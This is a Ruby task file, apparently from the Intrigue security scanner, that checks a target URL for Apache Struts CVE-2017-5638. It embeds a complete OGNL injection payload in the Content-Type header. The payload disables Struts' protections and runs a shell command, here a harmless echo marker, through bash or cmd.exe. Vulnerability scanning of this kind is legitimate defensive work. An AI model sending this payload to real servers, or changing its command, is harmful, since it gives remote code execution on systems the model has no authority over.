module Intrigue
  module Task
  class ApacheStrutsJakartaParser < BaseTask
  
    def self.metadata
      {
        :name => "vuln/apache_struts_jakarta_parser",
        :pretty_name => "Vuln Check - Apache Struts Jakarta Parser",
        :identifiers => [{ "cve" =>  "CVE-2017-5638" }],
        :authors => ["jcran"],
        :description => "Trigger Apache Struts CVE-2017-5638 Jakarta Parser",
        :references => [
          "https://blog.qualys.com/securitylabs/2017/03/14/apache-struts-cve-2017-5638-vulnerability-and-the-qualys-solution"
        ],
        :type => "vuln_check",
        :passive => false,
        :allowed_types => ["Uri"],
        :example_entities => [ 
          {"type" => "Uri", "details" => {"name" => "https://intrigue.io"}} 
        ],
        :allowed_options => [],
        :created_types => []
      }
    end
  
    ## Default method, subclasses must override this
    def run
      super
  
      # first, ensure we're fingerprinted
      require_enrichment
  
      uri = _get_entity_name
  
      headers = {}
      headers["Content-Type"] = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo intrigue-struts2').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
  
      response = http_request(:get, uri, nil, headers) # no auth
  
      unless response
        _log_error "No response received"
        return
      end
          
      if response.body_utf8 =~ /intrigue-struts2/
        
        instance_details = { 
          proof: "#{response.body_utf8}",
        }
        _create_linked_issue "apache_struts_jakarta_parser", instance_details
      end
    end
  
  end
  end
  end